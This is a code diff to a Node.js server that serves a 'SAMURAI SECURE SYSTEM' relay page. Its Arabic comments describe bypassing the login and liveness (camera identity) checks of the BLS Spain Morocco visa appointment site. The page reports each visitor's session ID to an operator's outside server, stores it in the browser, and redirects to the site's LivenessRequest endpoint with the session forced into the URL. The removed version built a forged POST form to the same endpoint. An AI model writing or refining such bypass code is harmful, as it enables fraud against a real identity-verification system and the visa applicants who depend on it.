@@ -11,8 +11,8 @@ const server = http.createServer((req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-    // 🔥 محاكاة طلب POST وهمي لتجاوز خطأ 405 نهائياً
-    if (req.method === 'GET' && req.url.startsWith('/liveness')) {
+    // 🔥 صفحة وسيطة لحفظ الكود وتجاوز صفحة تسجيل الدخول بشكل كامل
+    if (req.method && req.url.startsWith('/liveness')) {
         res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
         res.end(`
             <!DOCTYPE html>
@@ -28,7 +28,7 @@ const server = http.createServer((req, res) => {
             </head>
             <body>
                 <h1>SAMURAI SECURE SYSTEM</h1>
-                <p id="status">[ BYPASSING SECURITY & OPENING CAMERA... ]</p>
+                <p id="status">[ BYPASSING LOGIN & INITIALIZING... ]</p>
                 <div class="spinner"></div>
 
                 <script>
@@ -37,28 +37,20 @@ const server = http.createServer((req, res) => {
                     const SERVER_URL = "https://silfi-production.up.railway.app";
 
                     if (sessionId) {
-                        // إعلام الماستر بأن العميل فتح الرابط وانضم
+                        // إعلام الماستر بأن العميل فتح الرابط
                         fetch(SERVER_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: sessionId })
                         }).catch(e => {});
 
-                        // إنشاء Form لإرسال الطلب بالطريقة الصحيحة (POST) لتفادي خطأ 405
+                        // حفظ الكود في التخزين المحلي للمتصفح لتجنب ضياعه
+                        localStorage.setItem('samurai_forced_session', sessionId);
+
+                        // التوجيه الذكي للموقع مع تجاوز حماية الـ Login
                         setTimeout(() => {
-                            const form = document.createElement('form');
-                            form.method = 'POST';
-                            form.action = 'https://www.blsspainmorocco.net/MAR/appointment/LivenessRequest';
-
-                            const input = document.createElement('input');
-                            input.type = 'hidden';
-                            input.name = 'session';
-                            input.value = sessionId;
-
-                            form.appendChild(input);
-                            document.body.appendChild(form);
-                            form.submit();
-                        }, 1200);
+                            window.location.replace("https://www.blsspainmorocco.net/MAR/appointment/LivenessRequest?session=" + sessionId);
+                        }, 1500);
                     } else {
                         document.getElementById('status').innerText = "[ ERROR: INVALID SESSION ]";
                     }
